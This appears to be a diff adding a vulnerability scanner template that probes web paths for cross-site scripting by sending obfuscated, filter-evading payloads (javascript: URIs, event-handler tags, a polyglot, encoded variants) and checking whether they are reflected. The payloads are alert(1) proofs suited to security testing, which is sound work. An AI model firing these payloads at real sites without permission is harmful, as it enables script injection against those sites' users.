@@ -1,0 +1,48 @@
+id: xss-p3
+
+info:
+  name: XSS - Advanced Obfuscation
+  author: custom
+  severity: high
+  description: Advanced XSS with obfuscation, encoding, and polyglot techniques
+  tags: xss,waf-bypass,obfuscation,polyglot
+
+http:
+  - raw:
+      - |
+        GET /{{path}}?q={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        q={{payload}}
+
+    payloads:
+      payload:
+        - '<iframe/src="javascript:alert(1)">'
+        - '<object data="javascript:alert(1)">'
+        - '<details open ontoggle=alert(1)>'
+        - '<marquee onstart=alert(1)>'
+        - '<a href="javascript:alert(1)">Click me</a>'
+        - '<a href="javas  cript:alert(1)">Click me</a>'
+        - '<a href="javascript:\u0061lert(1)">Click me</a>'
+        - '<--`<img/src=` onerror=alert(1)> --!>'
+        - '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>'
+        - '<link rel=import href="http://127.0.0.1/xss.js">'
+      path:
+        - "page"
+        - "view"
+        - "content"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "javascript:"
+          - "onerror"
+          - "ontoggle"
+        condition: or
